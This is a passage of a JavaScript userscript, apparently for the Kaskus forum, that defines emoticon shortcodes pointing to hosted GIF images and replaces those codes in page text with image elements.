		src: "http://img690.imageshack.us/img690/4295/emokaskusmenujutkpsmall.gif",
		alt: "csgakmod"
	};
	emoticons[":bagicendol"] = {
		src: "http://i1130.photobucket.com/albums/m537/kaskuser2010/konche-bagicendol.gif",
		alt: "csgakmod"
	};
	emoticons[":ngopi"] = {
		src: "http://i566.photobucket.com/albums/ss104/konche2009/kaskus/ngopi-kamushal142.gif",
		alt: "csgakmod"
	};
	emoticons[":ak47"] = {
		src: "http://i566.photobucket.com/albums/ss104/konche2009/kaskus/patroli16.gif",
		alt: "csgakmod"
	};
	emoticons[":tapoktai"] = {
		src: "http://i566.photobucket.com/albums/ss104/konche2009/kaskus/taibig-lasermild16.gif",
		alt: "csgakmod"
	};
	emoticons[":kabur"] = {
		src: "http://i566.photobucket.com/albums/ss104/konche2009/lari.gif",
		alt: "csgakmod"
	};
	emoticons[":nopic"] = {
		src: "http://i1130.photobucket.com/albums/m537/kaskuser2010/kaskus/hpyhop.gif",
		alt: "csgakmod"
	};
	emoticons[":wedi"] = {
		src: "http://imgcash4.imageshack.us/img16/3449/takutbycraive.gif",
		alt: "csgakmod"
	};
	emoticons[":deal"] = {
		src: "http://i566.photobucket.com/albums/ss104/konche2009/salaman.gif",
		alt: "csgakmod"
	};
	emoticons[":kmw"] = {
		src: "http://i1130.photobucket.com/albums/m537/kaskuser2010/konche-kmw.gif",
		alt: "csgakmod"
	};
	emoticons[":net"] = {
		src: "http://s6.tinypic.com/ak759k_th.gif",
		alt: "csgakmod"
	};
	emoticons[":sembunyi"] = {
		src: "http://img.photobucket.com/albums/v630/BleeMoonFeel/korban_pengarungan_100small.gif",
		alt: "csgakmod"
	};
	emoticons[":buffer"] = {
		src: "http://i889.photobucket.com/albums/ac93/cacingworem/buffer.gif",
		alt: "csgakmod"
	};
	emoticons[":Piss"] = {
		src: "http://i870.photobucket.com/albums/ab266/adamnh-corner/peace-small.gif",
		alt: "csgakmod"
	};
	emoticons[":gm"] = {
		src: "http://i492.photobucket.com/albums/rr285/ardyotha/malingasia.gif",
		alt: "csgakmod"
	};
	emoticons[":gd"] = {
		src: "http://i832.photobucket.com/albums/zz243/soecakep/emoticon%20kaskus/garuda-didadaku-kecil.gif",
		alt: "csgakmod"
	};
	emoticons[":mp"] = {
		src: "http://img192.imageshack.us/img192/5226/baruu.gif",
		alt: "csgakmod"
	};
	emoticons[":Pertamax"] = {
		src: "http://i1130.photobucket.com/albums/m537/kaskuser2010/1st.gif",
		alt: "csgakmod"
	};
var emotxt = [];
var yemo = [];
var c;
for (var emo in emoticons) 
	if (!(emoticons[emo] instanceof Function)) {
		c = emo.charCodeAt(0);
		if (!yemo[c]) 
			yemo[c] = [];
		
		yemo[c].push({
			emoticon: emo,
			src: emoticons[emo].src
		});
	}
	
function f(o1, o2){
	if (o1.emoticon.isPrefixOf(o2.emoticon)) 
		return 1;
	
	if (o1.emoticon > o2.emoticon) 
		return 1;
	
	if (o1.emoticon < o2.emoticon) 
		return -1;
	
	return 0;
}
var i;	
for (i = 0; i < yemo.length; i++) 
	if (yemo[i]) 
		yemo[i].sort(f);
	
function replaceTextNode(textNode, sortedEmoticonSet)
{
	var content = textNode.textContent;
	var currentStopPosition;
	var i, j;
	var firstChar;
	var found = false;
	var htmls = [];
	var img;
	currentStopPosition = i = 0;
	while (i < content.length) {
		firstChar = content.charCodeAt(i);
		if (sortedEmoticonSet[firstChar]) 
			for (j = 0; j < sortedEmoticonSet[firstChar].length; j++) 
				if (sortedEmoticonSet[firstChar][j].emoticon.length && sortedEmoticonSet[firstChar][j].emoticon.isPrefixOf(content, i)) {
					if (currentStopPosition < i) 
						htmls.push(document.createTextNode(content.substr(currentStopPosition, i - currentStopPosition)))
					
					img = document.createElement('img');
					img.src = sortedEmoticonSet[firstChar][j].src;
					img.title = sortedEmoticonSet[firstChar][j].emoticon;
					htmls.push(img);
					
					
					i += sortedEmoticonSet[firstChar][j].emoticon.length;
					currentStopPosition = i;
					found = true;
					break;
				}
		
		if (found) {
			found = false;
			continue;
		}
		i++;
	}
	
	if(currentStopPosition>0&&currentStopPosition<content.length-1)
		htmls.push(document.createTextNode(content.substr(currentStopPosition)));
	
	var span=null;
	if (htmls.length) {
		span=document.createElement('span');
		for (i = 0; i < htmls.length; i++) 
			span.appendChild(htmls[i]);
	}
	return span;
}

function replaceElement(element, emos){
	var pathResult = document.evaluate(".//text()", element, null, 7, null);
	
	for (i = 0; i < pathResult.snapshotLength; i++) {
		var tNode = pathResult.snapshotItem(i);
		if (tNode.parentNode) {
			var span = replaceTextNode(tNode, emos);
			if (span) 
				tNode.parentNode.replaceChild(span, tNode);
		}
	}
}
